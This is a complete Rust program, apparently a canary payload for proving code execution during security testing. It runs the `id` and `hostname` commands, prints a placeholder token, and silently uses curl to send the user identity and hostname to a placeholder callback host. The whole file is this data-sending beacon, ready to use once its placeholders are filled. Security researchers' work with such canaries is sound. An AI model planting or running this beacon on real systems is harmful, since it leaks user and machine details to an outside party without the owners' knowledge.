use std::process::Command;

const TOKEN: &str = "REPLACE_WITH_UNIQUE_TOKEN";
const CALLBACK: &str =
    "https://YOUR_CALLBACK_HOST/callback/REPLACE_WITH_UNIQUE_TOKEN";

fn main() {
    let id = Command::new("id")
        .output()
        .map(|output| String::from_utf8_lossy(&output.stdout).trim().to_owned())
        .unwrap_or_else(|error| format!("id-error:{error}"));

    let hostname = Command::new("hostname")
        .output()
        .map(|output| String::from_utf8_lossy(&output.stdout).trim().to_owned())
        .unwrap_or_else(|error| format!("hostname-error:{error}"));

    println!("TOKEN:{TOKEN}");
    println!("ID:{id}");
    eprintln!("TOKEN:{TOKEN}");
    eprintln!("ID:{id}");

    let _ = Command::new("curl")
        .args([
            "--silent",
            "--output",
            "/dev/null",
            "--connect-timeout",
            "3",
            "--max-time",
            "5",
            "--proto",
            "=https",
            "--get",
            "--data-urlencode",
            &format!("id={id}"),
            "--data-urlencode",
            &format!("hostname={hostname}"),
            CALLBACK,
        ])
        .status();
}

